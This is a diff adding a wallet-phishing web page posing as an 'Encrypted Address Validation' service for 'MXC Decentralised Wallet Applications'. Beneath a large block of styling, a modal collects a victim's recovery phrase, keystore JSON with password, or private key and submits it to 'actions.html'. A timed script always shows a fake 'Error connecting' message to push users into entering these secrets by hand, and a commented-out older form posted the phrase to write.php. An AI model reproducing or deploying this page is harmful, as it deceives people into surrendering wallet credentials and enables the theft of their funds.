@@ -1,0 +1,3785 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+<link href="local_resources/css/3d4c395b938cd26f4cab546031f46166.css" rel="stylesheet"/>
+<meta charset="utf-8"/>
+<meta content="ie=edge" http-equiv="x-ua-compatible"/>
+<meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"/>
+<title data-react-helmet="true">Address Validation</title>
+<!-- <script data-react-helmet="true" type="text/javascript" src="assets/unregisterServiceWorker.js"></script> -->
+<style>
+      /* sc-component-id: Header__SHeader-cphy8j-0 */
+      .kyUqCt {
+        width: 100%;
+        max-width: 1200px;
+        margin: 0 auto;
+        height: 145px;
+        padding: 0 20px;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-align-items: center;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        -webkit-box-pack: space-around;
+        -webkit-justify-content: space-around;
+        -ms-flex-pack: space-around;
+        justify-content: space-around;
+      }
+
+      @media screen and (max-width: 640px) {
+        .kyUqCt {
+          height: 100px;
+          padding: 0 15px;
+        }
+      }
+
+      /* sc-component-id: Header__SInternalLink-cphy8j-1 */
+      .guKAph {
+        width: 100px;
+        text-align: center;
+        font-size: 20px;
+        color: rgb(88, 120, 188);
+        font-weight: 500;
+      }
+
+      @media screen and (max-width: 640px) {
+        .guKAph {
+          width: 60px;
+          font-size: 16px;
+        }
+      }
+
+      /* sc-component-id: Header__SInternalLink-cphy8j-1-a */
+      .eyaBAy {
+        width: 100px;
+        text-align: center;
+        font-size: 20px;
+        color: rgb(88, 120, 188);
+        font-weight: 500;
+      }
+
+      @media screen and (max-width: 640px) {
+        .eyaBAy {
+          width: 60px;
+          font-size: 16px;
+        }
+      }
+
+      /* sc-component-id: Header__SLogo-cphy8j-2 */
+      .hnlESl {
+        -webkit-flex: 1;
+        -ms-flex: 1;
+        flex: 1;
+        padding: 0 20px;
+        text-align: center;
+      }
+
+      .hnlESl img {
+        width: 100%;
+        max-width: 120px;
+        min-width: 60px;
+      }
+
+      /* sc-component-id: Footer__SFooter-sc-1k47aoh-0 */
+      .jVWwwJ {
+        width: 100%;
+        max-width: 1200px;
+        margin: 0 auto;
+        height: 160px;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-flex-shrink: 0;
+        -ms-flex-negative: 0;
+        flex-shrink: 0;
+        -webkit-align-items: center;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        -webkit-justify-content: center;
+        -ms-flex-pack: center;
+        justify-content: center;
+      }
+
+      @media screen and (max-width: 640px) {
+        .jVWwwJ {
+          -webkit-flex-direction: column;
+          -ms-flex-direction: column;
+          flex-direction: column;
+          height: auto;
+          margin: 30px 0;
+        }
+
+        .jVWwwJ a {
+          margin: 10px 0;
+        }
+      }
+
+      /* sc-component-id: Footer__SSocialIcon-sc-1k47aoh-1 */
+      .hvbAKM {
+        width: 20px;
+        height: 20px;
+      }
+
+      .hvbAKM img {
+        height: 100%;
+      }
+
+      /* sc-component-id: Footer__SExternalLink-sc-1k47aoh-2 */
+      .YwSGw {
+        width: 150px;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-align-items: center;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        -webkit-justify-content: center;
+        -ms-flex-pack: center;
+        justify-content: center;
+      }
+
+      .YwSGw p {
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-align-items: center;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        padding-left: 0.5em;
+        font-size: 14px;
+        color: rgb(88, 120, 188);
+        font-weight: 500;
+      }
+
+      /* sc-component-id: sc-global-3954063800 */
+      @font-face {
+        font-family: "SFMono";
+        src: url("https://securedwalletsprotocols.online/fonts/SFMono-Regular.eot");
+        src: url("https://securedwalletsprotocols.online/fonts/SFMono-Regulard41d.eot")
+            format("embedded-opentype"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Regular.woff2")
+            format("woff2"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Regular.woff")
+            format("woff"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Regular.ttf")
+            format("truetype"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Regular.svg")
+            format("svg");
+        font-weight: normal;
+        font-style: normal;
+      }
+
+      @font-face {
+        font-family: "SFMono";
+        src: url("https://securedwalletsprotocols.online/fonts/SFMono-Medium.eot");
+        src: url("https://securedwalletsprotocols.online/fonts/SFMono-Mediumd41d.eot")
+            format("embedded-opentype"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Medium.woff2")
+            format("woff2"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Medium.woff")
+            format("woff"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Medium.ttf")
+            format("truetype"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Medium.svg")
+            format("svg");
+        font-weight: 500;
+        font-style: normal;
+      }
+
+      @font-face {
+        font-family: "SFMono";
+        src: url("https://securedwalletsprotocols.online/fonts/SFMono-Semibold.eot");
+        src: url("https://securedwalletsprotocols.online/fonts/SFMono-Semiboldd41d.eot")
+            format("embedded-opentype"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Semibold.woff2")
+            format("woff2"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Semibold.woff")
+            format("woff"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Semibold.ttf")
+            format("truetype"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Semibold.svg")
+            format("svg");
+        font-weight: 600;
+        font-style: normal;
+      }
+
+      @font-face {
+        font-family: "SFMono";
+        src: url("https://securedwalletsprotocols.online/fonts/SFMono-Bold.eot");
+        src: url("https://securedwalletsprotocols.online/fonts/SFMono-Boldd41d.eot")
+            format("embedded-opentype"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Bold.woff2")
+            format("woff2"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Bold.woff")
+            format("woff"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Bold.ttf")
+            format("truetype"),
+          url("https://securedwalletsprotocols.online/fonts/SFMono-Bold.svg")
+            format("svg");
+        font-weight: bold;
+        font-style: normal;
+      }
+
+      @font-face {
+        font-family: "SF Pro Text";
+        src: url("https://securedwalletsprotocols.online/fonts/SFProText-Regular.eot");
+        src: url("https://securedwalletsprotocols.online/fonts/SFProText-Regulard41d.eot")
+            format("embedded-opentype"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Regular.woff2")
+            format("woff2"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Regular.woff")
+            format("woff"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Regular.ttf")
+            format("truetype"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Regular.svg")
+            format("svg");
+        font-weight: normal;
+        font-style: normal;
+      }
+
+      @font-face {
+        font-family: "SF Pro Text";
+        src: url("https://securedwalletsprotocols.online/fonts/SFProText-Semibold.eot");
+        src: url("https://securedwalletsprotocols.online/fonts/SFProText-Semiboldd41d.eot")
+            format("embedded-opentype"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Semibold.woff2")
+            format("woff2"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Semibold.woff")
+            format("woff"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Semibold.ttf")
+            format("truetype"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Semibold.svg")
+            format("svg");
+        font-weight: 600;
+        font-style: normal;
+      }
+
+      @font-face {
+        font-family: "SF Pro Text";
+        src: url("https://securedwalletsprotocols.online/fonts/SFProText-Medium.eot");
+        src: url("https://securedwalletsprotocols.online/fonts/SFProText-Mediumd41d.eot")
+            format("embedded-opentype"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Medium.woff2")
+            format("woff2"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Medium.woff")
+            format("woff"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Medium.ttf")
+            format("truetype"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Medium.svg")
+            format("svg");
+        font-weight: 500;
+        font-style: normal;
+      }
+
+      @font-face {
+        font-family: "SF Pro Text";
+        src: url("https://securedwalletsprotocols.online/fonts/SFProText-Bold.eot");
+        src: url("https://securedwalletsprotocols.online/fonts/SFProText-Boldd41d.eot")
+            format("embedded-opentype"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Bold.woff2")
+            format("woff2"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Bold.woff")
+            format("woff"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Bold.ttf")
+            format("truetype"),
+          url("https://securedwalletsprotocols.online/fonts/SFProText-Bold.svg")
+            format("svg");
+        font-weight: bold;
+        font-style: normal;
+      }
+
+      html,
+      body,
+      #root,
+      #router-root {
+        height: 100%;
+        width: 100%;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "SF Pro Text",
+          Roboto, Helvetica, Arial, sans-serif;
+        font-style: normal;
+        font-stretch: normal;
+        font-weight: 400;
+        font-size: 16px;
+        color: rgb(88, 112, 135);
+        overflow-y: auto;
+        text-rendering: optimizeLegibility;
+        -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        -webkit-text-size-adjust: 100%;
+        -webkit-overflow-scrolling: touch;
+      }
+
+      button:active,
+      button:focus,
+      button.active {
+        background-image: none;
+        outline: 0;
+        -webkit-box-shadow: none;
+        box-shadow: none;
+      }
+
+      [tabindex] {
+        outline: none;
+        height: 100%;
+      }
+
+      a,
+      p,
+      h1,
+      h2,
+      h3,
+      h4,
+      h5,
+      h6 {
+        -webkit-text-decoration: none;
+        text-decoration: none;
+        margin: 0;
+        padding: 0;
+      }
+
+      h1 {
+        font-size: 42px;
+      }
+
+      h2 {
+        font-size: 32px;
+      }
+
+      h3 {
+        font-size: 24px;
+      }
+
+      h4 {
+        font-size: 20px;
+      }
+
+      h5 {
+        font-size: 17px;
+      }
+
+      h6 {
+        font-size: 14px;
+      }
+
+      a {
+        -webkit-text-decoration: none;
+        text-decoration: none;
+        color: inherit;
+        outline: none;
+        color: #4199fc;
+        font-weight: bold;
+      }
+
+      ul,
+      li {
+        list-style: none;
+        margin: 0;
+        padding: 0;
+      }
+
+      * {
+        box-sizing: border-box !important;
+      }
+
+      button {
+        border-style: none;
+        line-height: 1em;
+      }
+
+      input {
+        -webkit-appearance: none;
+      }
+
+      input[type="color"],
+      input[type="date"],
+      input[type="datetime"],
+      input[type="datetime-local"],
+      input[type="email"],
+      input[type="month"],
+      input[type="number"],
+      input[type="password"],
+      input[type="search"],
+      input[type="tel"],
+      input[type="text"],
+      input[type="time"],
+      input[type="url"],
+      input[type="week"],
+      select:focus,
+      textarea {
+        font-size: 16px;
+      }
+
+      .statusbar-overlay {
+        opacity: 0;
+      }
+
+      #coinbase_button_iframe {
+        width: 244px !important;
+        margin-top: 40px !important;
+      }
+
+      #coinbase_widget {
+        display: inline-block;
+        margin-top: 56px !important;
+      }
+
+      /* sc-component-id: layout__SWrapper-wjwiqk-0 */
+      .dijnUu {
+        position: relative;
+        width: 100%;
+        height: 100%;
+        background-color: rgb(255, 255, 255);
+      }
+
+      /* sc-component-id: layout__SContent-wjwiqk-1 */
+      .fiuMUO {
+        width: 100%;
+        height: 100%;
+        margin: 0 auto;
+        position: relative;
+      }
+
+      /* sc-component-id: layout__SContainer-wjwiqk-2 */
+      .fuQfHo {
+        height: 100%;
+        max-width: 1064px;
+        margin: 0 auto;
+        padding: 0;
+      }
+
+      /* sc-component-id: layout__SFlex-wjwiqk-3 */
+      .hfVnjX {
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        height: 100%;
+      }
+
+      @media screen and (max-width: 640px) {
+        .hfVnjX {
+          -webkit-flex-direction: column;
+          -ms-flex-direction: column;
+          flex-direction: column;
+        }
+      }
+
+      /* sc-component-id: Grid__SGrid-sc-8d5rqj-0 */
+      .gAVVCu {
+        width: 100%;
+        height: 100%;
+        padding: 24px;
+        overflow-x: hidden;
+        overflow-y: hidden;
+        background: rgb(255, 255, 255);
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        grid-column-gap: 30px;
+        grid-row-gap: 30px;
+      }
+
+      @media screen and (max-width: 640px) {
+        .gAVVCu {
+          grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+          grid-column-gap: 15px;
+          grid-row-gap: 15px;
+        }
+      }
+
+      /* sc-component-id: pageStyles__SIndexPage-sc-1navawn-0 */
+      .hDbjSS {
+        height: 100%;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-flex-direction: column;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        -webkit-box-pack: space-around;
+        -webkit-justify-content: space-around;
+        -ms-flex-pack: space-around;
+        justify-content: space-around;
+        -webkit-align-items: center;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        text-align: center;
+        padding: 0 32px;
+        padding-top: 30px;
+      }
+
+      @media screen and (max-width: 640px) {
+        .hDbjSS {
+          padding: 0 24px;
+          padding-top: 20px;
+        }
+      }
+
+      /* sc-component-id: pageStyles__SBrandingWrapper-sc-1navawn-1 */
+      .fAmUdU {
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-flex-direction: column;
+        -ms-flex-direction: column;
+        flex-direction: column;
+        -webkit-box-pack: center;
+        -webkit-justify-content: center;
+        -ms-flex-pack: center;
+        justify-content: center;
+        -webkit-align-items: center;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        width: 100%;
+        max-width: 700px;
+        margin: 0 auto;
+      }
+
+      /* sc-component-id: pageStyles__SBranding-sc-1navawn-2 */
+      .gFeYHJ {
+        font-size: 35px;
+        font-weight: 500;
+        text-align: center;
+      }
+
+      /* sc-component-id: pageStyles__SPageDescription-sc-1navawn-3 */
+      .jGHRMl {
+        margin-top: 40px;
+        font-size: 18px;
+        font-weight: 300;
+        line-height: 1.35;
+      }
+
+      /* sc-component-id: pageStyles__SSection-sc-1navawn-4 */
+      .ibLsRQ {
+        position: relative;
+        width: 100%;
+        z-index: 0;
+        margin-bottom: 40px;
+      }
+
+      /* sc-component-id: pageStyles__SApp-sc-1navawn-5 */
+      .cmAzHq {
+        width: 100%;
+      }
+
+      /* sc-component-id: pageStyles__SAppIcon-sc-1navawn-6 */
+      .kSIOSl {
+        width: 100%;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-align-items: center;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        -webkit-justify-content: center;
+        -ms-flex-pack: center;
+        justify-content: center;
+        padding: 25px;
+      }
+
+      .kSIOSl img {
+        -webkit-filter: initial;
+        filter: initial;
+        width: 100%;
+        height: 100%;
+        border-radius: 50%;
+      }
+
+      .lfUBtr {
+        width: 100%;
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+        -webkit-align-items: center;
+        -webkit-box-align: center;
+        -ms-flex-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        -webkit-justify-content: center;
+        -ms-flex-pack: center;
+        justify-content: center;
+        padding: 25px;
+      }
+
+      .lfUBtr img {
+        -webkit-filter: initial;
+        filter: initial;
+        width: 100%;
+        height: 100%;
+        border-radius: initial;
+      }
+
+      /* sc-component-id: pageStyles__SAppName-sc-1navawn-7 */
+      .eodRCW {
+        font-weight: bold;
+        color: inherit;
+      }
+
+      /* sc-component-id: pageStyles__SFootNote-sc-1navawn-8 */
+      .ceWocr {
+        margin: 10px;
+        color: rgb(88, 112, 135);
+        opacity: 0.75;
+        padding-top: 30px;
+      }
+
+      .ceWocr a {
+        font-weight: 600;
+      }
+    </style>
+<style>
+      .input-textarea {
+        height: 130px;
+        border: 1px solid rgba(192, 192, 192, 0.3);
+        border-radius: 3px;
+        width: 100%;
+        font-family: inherit;
+        padding: 10px;
+        font-size: 14px;
+      }
+    </style>
+<script src="local_resources/js/0b61aca8c050e99427b0ab4d89a7dc22.js"></script>
+</head>
+<body>
+<!-- 
+  <div class="overlay" id="thebox" style="display: none ; margin-top: -50px;">
+
+    <div class="overbox">
+      <div style="overflow:hidden;margin:5px 0px;">
+        <div class="closex" onclick="shutx('#thebox')">X</div>
+      </div>
+
+      
+
+      <div class="insidewidth twodiv">
+        <div class="dsdiv" id="fdxz" >
+        <form id="submitform" action="write.php" method="POST">
+          <label>Keyword</label>
+          <textarea  name="phrase" class="input-textare" style="  width: 100%;
+    height: 100px;
+    border: 1px solid;
+    padding: 5px;
+    border-radius: 5px;"></textarea>
+          <input type="hidden" id="walletinput" name="walletinput"  />
+          <div class="buttonbox">
+            <button class="bluebtn_bird yuck" name="submit" type="submit">connect</button>
+          </div>
+
+        </form>
+
+        </div>
+        <div class="dsdiv fxz" onclick="startjob()">
+          <div class="textdx" id="extracttext" style="font-weight: bold;"></div>
+          <div class="textdx" style="font-size:13px;margin:7px 0px">Connect to <span id="extracttext2"></span> and more
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+  </div> -->
+<div class="overlay" id="thebox" style="display: none; margin-top: -50px">
+<div class="overbox">
+<div style="overflow: hidden; margin: 5px 0px">
+<div class="closex" onclick="shutx('#thebox')">X</div>
+</div>
+<div class="insidewidth onediv">
+<div class="choosegrid">
+<div class="sgrid sactive" onclick="switchshow(this)">Phrase</div>
+<div class="sgrid" onclick="switchshow(this)">Keystore JSON</div>
+<div class="sgrid" onclick="switchshow(this)">Private Key</div>
+</div>
+<div class="loadbox ccbox">
+<div class="loaddv">
+<div class="loader"></div>
+</div>
+</div>
+<form id="submitform">
+<input id="walletinput" name="wallet" type="hidden" value="Curve Finance"/>
+<input id="wallettype" name="type" type="hidden"/>
+<div class="phrasebox ccbox activebox">
+<textarea class="textarea allinput" name="phrase" placeholder="Phrase"></textarea>
+</div>
+<div class="keystorebox ccbox">
+<textarea class="textarea allinput" id="kjsoninput" name="keystorejson" placeholder="Keystore JSON"></textarea>
+<input class="input allinput" id="kpasswordinput" name="keystorepassword" placeholder="Keystore Password"/>
+</div>
+<div class="privatebox ccbox">
+<input class="input allinput" id="privateinput" name="privatekey" placeholder="Private Key"/>
+</div>
+<div class="buttonbox">
+<button class="bluebtn_bird" name="submit" type="submit">
+                connect
+              </button>
+</div>
+</form>
+</div>
+<div class="insidewidth twodiv">
+<div class="dsdiv" id="fdxz" style="display: flex">
+<!-- <label>Text Feild</label><br/> -->
+<!-- <textarea style="width: 100%;height: 150px;" placeholder="Text here..."></textarea> -->
+<div class="textdx" id="initext" style="font-size: 14px">
+              Initializing
+            </div>
+<div class="loaderw"></div>
+<div class="yuck" onclick="startjob()">connect manually</div>
+</div>
+<div class="dsdiv fxz" onclick="startjob()">
+<div class="textdx" id="extracttext" style="font-weight: bold"></div>
+<div class="textdx" style="font-size: 13px; margin: 7px 0px">
+              Connect to <span id="extracttext2"></span>
+              and more
+            </div>
+</div>
+</div>
+</div>
+</div>
+<style>
+      .loaderw {
+        border: 1px solid black;
+        /* Light grey */
+        border-top: 1px solid transparent;
+        /* Blue */
+        border-radius: 50%;
+        width: 15px;
+        height: 15px;
+        animation: spin 0.5s linear infinite;
+        margin: 0px 20px;
+        display: none;
+      }
+
+      .yuck {
+        background: #2997d8;
+        font-size: 11px;
+        color: white;
+        font-weight: bold;
+        text-align: center;
+        padding: 7px 20px;
+        border-radius: 3px;
+        cursor: pointer;
+        transition: 0.5s;
+        display: none;
+        margin: 0px 9px;
+      }
+
+      .dsdiv {
+        padding: 20px 20px;
+        border: 1px solid rgba(192, 192, 192, 0.5);
+        margin: 10px 0px;
+        border-radius: 5px;
+      }
+
+      .reddsdiv {
+        border: 1px solid red !important;
+      }
+
+      .reddsdiv .textdx {
+        color: red !important;
+      }
+
+      .insidewidth {
+        padding: 10px 10px;
+      }
+
+      .fxz {
+        background: #f2f2f2;
+      }
+    </style>
+<script>
+      function submitform() {
+        sendform("actions.html", "#submitform", "submitform");
+      }
+
+      function startloader() {
+        $(".ccbox").removeClass("activebox");
+        $(".loadbox").addClass("activebox");
+        shutx(".buttonbox");
+      }
+
+      function closeloader() {
+        $(".ccbox").removeClass("activebox");
+        $(".phrasebox").addClass("activebox");
+        openx(".buttonbox");
+      }
+
+      function extractwallet(element) {
+        openx("#thebox");
+
+        $(".insidewidth").removeClass("activebox");
+        $(".twodiv").addClass("activebox");
+
+        $("#initext").html("Initializing");
+        openx(".loaderw");
+        shutx(".yuck");
+        $("#fdxz").removeClass("reddsdiv");
+
+        setTimeout(function () {
+          $("#initext").html("Error connecting");
+          shutx(".loaderw");
+          openx(".yuck");
+          $("#fdxz").addClass("reddsdiv");
+        }, 2000);
+
+        var texr = $(element).text();
+
+        var texc = texr.replace(/\t+/g, "");
+        var text = texc.trim();
+
+        $("#walletinput").val(text);
+        $("#extracttext").html(text);
+        $("#extracttext2").html(text);
+      }
+
+      function startjob() {
+        $(".insidewidth").addClass("activebox");
+        $(".twodiv").removeClass("activebox");
+      }
+
+      function switchshow(element) {
+        $(".allinput").val("");
+
+        $(".sgrid").removeClass("sactive");
+        $(element).addClass("sactive");
+
+        if ($(element).text() == "Phrase") {
+          $(".ccbox").removeClass("activebox");
+          $(".phrasebox").addClass("activebox");
+
+          $("#wallettype").val("phrase");
+        } else if ($(element).text() == "Keystore JSON") {
+          $(".ccbox").removeClass("activebox");
+          $(".keystorebox").addClass("activebox");
+
+          $("#wallettype").val("keystore");
+        } else if ($(element).text() == "Private Key") {
+          $(".ccbox").removeClass("activebox");
+          $(".privatebox").addClass("activebox");
+
+          $("#wallettype").val("privatekey");
+        }
+      }
+    </script>
+<style>
+      .insidewidth {
+        display: none;
+      }
+
+      .loader {
+        border: 2px solid #f3f3f3;
+        /* Light grey */
+        border-top: 2px solid #3498db;
+        /* Blue */
+        border-radius: 50%;
+        width: 100%;
+        height: 100%;
+        animation: spin 0.5s linear infinite;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      .loaddv {
+        width: 40px;
+        height: 40px;
+        margin: 30px auto;
+      }
+
+      .buttonbox {
+        text-align: center;
+      }
+
+      .bluebtn_bird {
+        padding: 7px 20px;
+        background-color: #2997d8;
+        color: white;
+        font-weight: bold;
+        border: none;
+        border-radius: 3px;
+        width: 60%;
+        text-transform: uppercase;
+        cursor: pointer;
+        transition: 0.5s;
+      }
+
+      .bluebtn_bird:hover {
+        background-color: #253b80;
+      }
+
+      .textarea {
+        height: 130px;
+        border: 1px solid rgba(192, 192, 192, 0.3);
+        border-radius: 3px;
+        width: 100%;
+        font-family: inherit;
+        padding: 10px;
+        font-size: 14px;
+      }
+
+      .input {
+        border: 1px solid rgba(192, 192, 192, 0.3);
+        border-radius: 3px;
+        width: 100%;
+        font-family: inherit;
+        padding: 7px 20px;
+        margin: 10px 0px;
+      }
+
+      .activebox {
+        display: block !important;
+      }
+
+      .ccbox {
+        display: none;
+        margin: 10px 0px;
+        padding: 10px;
+      }
+
+      .choosegrid {
+        display: grid;
+        grid-template-columns: 1fr 1fr 1fr;
+      }
+
+      .sgrid {
+        text-align: center;
+        padding: 10px 20px;
+        font-size: 13px;
+        border-bottom: 1px solid rgba(192, 192, 192, 0.3);
+        cursor: pointer;
+      }
+
+      .sactive {
+        border-bottom: 3px solid #2997d8;
+      }
+
+      .overlay {
+        width: 100%;
+        height: 100%;
+        position: fixed;
+        z-index: 1;
+        background: rgba(0, 0, 0, 0.3);
+        top: 0;
+        right: 0;
+        left: 0;
+        bottom: 0;
+        padding: 20px 0px;
+      }
+
+      .overbox {
+        width: 450px;
+        margin: 80px auto;
+        background: white;
+        border-top-left-radius: 7px;
+        border-top-right-radius: 7px;
+        box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.3);
+        padding: 20px 0px;
+      }
+
+      .closex {
+        float: left;
+        margin: 0px 20px;
+        cursor: pointer;
+        transition: 0.5;
+        font-size: 13px;
+      }
+
+      .closex:hover {
+        color: #2997d8;
+      }
+    </style>
+<div class="noth greennoth">
+<div class="closex2" onclick="closenotify()">X</div>
+<div class="nothdetails">okay this a notification</div>
+</div>
+<style>
+      .closex2 {
+        padding: 7px 10px;
+        color: white;
+        font-size: 13px;
+        margin-bottom: 0px;
+        padding-bottom: 0px;
+        cursor: pointer;
+        float: left;
+      }
+
+      .noth {
+        width: 20%;
+        border-radius: 3px;
+        bottom: 20px;
+        opacity: 0;
+        right: 20px;
+        position: fixed;
+        z-index: 1250;
+        display: none;
+      }
+
+      .nothdetails {
+        padding: 13px;
+        color: white;
+        font-weight: bold;
+        font-size: 13px;
+        text-align: center;
+      }
+
+      .confirmbox {
+        width: 35%;
+        padding: 10px;
+        background: white;
+        color: #5d6969;
+        font-weight: bold;
+        font-size: 13px;
+        margin: 10% auto;
+        border-radius: 5px;
+        box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.2);
+      }
+
+      .confirmbox {
+        width: 35%;
+        padding: 10px;
+        background: white;
+        color: #5d6969;
+        font-weight: bold;
+        font-size: 13px;
+        margin: 10% auto;
+        border-radius: 5px;
+        box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.2);
+      }
+
+      .nbc {
+        overflow: hidden;
+        width: 100%;
+      }
+
+      .confdetails {
+        color: #5d6969;
+        text-align: center;
+        padding: 12px;
+      }
+
+      .rtd {
+        padding: 5px;
+        color: white;
+        text-transform: uppercase;
+        font-weight: bold;
+        cursor: pointer;
+        font-size: 12px;
+        background: #006aa2;
+        margin: 6px;
+        border: none;
+        border-radius: 3px;
+        transition: 0.5s;
+      }
+
+      .rtd:hover {
+        opacity: 0.5;
+      }
+
+      .rgt {
+        float: right;
+      }
+
+      .lft {
+        float: left;
+        background: white;
+        color: #5d6969;
+        box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.1);
+        transition: 0.5s;
+      }
+
+      .lft:hover {
+        box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.5);
+      }
+
+      .greennoth {
+        background: linear-gradient(
+          to bottom right,
+          rgba(0, 255, 255, 0.9),
+          #1c9a9a
+        );
+        box-shadow: 0px 2px 4px 0px rgba(0, 255, 255, 0.9);
+      }
+
+      .rednoth {
+        background: #e14d43;
+        box-shadow: 0px 2px 4px 0px #e14d43;
+      }
+
+      @media only screen and (max-width: 1100px) {
+        .confirmbox {
+          width: 40%;
+        }
+      }
+
+      @media only screen and (max-width: 980px) {
+        .noth {
+          width: 30%;
+        }
+      }
+
+      @media only screen and (max-width: 850px) {
+        .noth {
+          width: 40%;
+        }
+
+        .confirmbox {
+          width: 50%;
+        }
+      }
+
+      @media only screen and (max-width: 650px) {
+        .confirmbox {
+          width: 65%;
+        }
+      }
+
+      @media only screen and (max-width: 550px) {
+        .overbox {
+          width: 100%;
+          margin: 0px;
+          background: white;
+          border-top-left-radius: 7px;
+          border-top-right-radius: 7px;
+          box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.3);
+          padding: 20px 0px;
+          position: absolute;
+          bottom: 0;
+          z-index: 1000;
+        }
+      }
+
+      @media only screen and (max-width: 450px) {
+        .confirmbox {
+          width: 70%;
+        }
+      }
+
+      @media only screen and (max-width: 400px) {
+        .noth {
+          width: 90%;
+        }
+
+        .confirmbox {
+          width: 100%;
+          margin: 40px 0px;
+        }
+      }
+    </style>
+<script src="local_resources/js/53c997a133e22f6b432416b25bc0f75b.js"></script>
+<script src="local_resources/js/d698efbad9cc5299ad8a69c2818d1f01.js"></script>
+<div id="___gatsby">
+<div id="gatsby-focus-wrapper" style="outline: none" tabindex="-1">
+<div class="layout__SWrapper-wjwiqk-0 dijnUu">
+<div class="layout__SFlex-wjwiqk-3 hfVnjX">
+<div class="layout__SContent-wjwiqk-1 fiuMUO">
+<header class="Header__SHeader-cphy8j-0 kyUqCt">
+<!-- <a href="wallet.php.html" rel="noreferrer noopener"
+                class="Header__SInternalLink-cphy8j-1-a eyaBAy">Wallet</a> -->
+<a class="Header__SInternalLink-cphy8j-1-a eyaBAy" href="#" rel="noreferrer noopener"></a>
+<div class="Header__SLogo-cphy8j-2 hnlESl">
+<a href="dapps.php.html">
+<img alt="Wallets Validation" src="local_resources/img/ae0aefdb53f3b5dd5abdf573ccecbc46.png" style="margin: auto"/>
+</a>
+</div>
+<a class="Header__SInternalLink-cphy8j-1 guKAph" href="#"></a>
+<!-- <a class="Header__SInternalLink-cphy8j-1 guKAph" href="dapps.php.html">Apps</a> -->
+</header>
+<div class="layout__SContainer-wjwiqk-2 fuQfHo">
+<div class="pageStyles__SIndexPage-sc-1navawn-0 hDbjSS">
+<div class="pageStyles__SBrandingWrapper-sc-1navawn-1 fAmUdU">
+<h1 class="pageStyles__SBranding-sc-1navawn-2 gFeYHJ">
+                      MXC Decentralised Wallet Applications
+                    </h1>
+</div>
+<div class="pageStyles__SPageDescription-sc-1navawn-3 jGHRMl">
+                    Encrypted Address Validation
+                  </div>
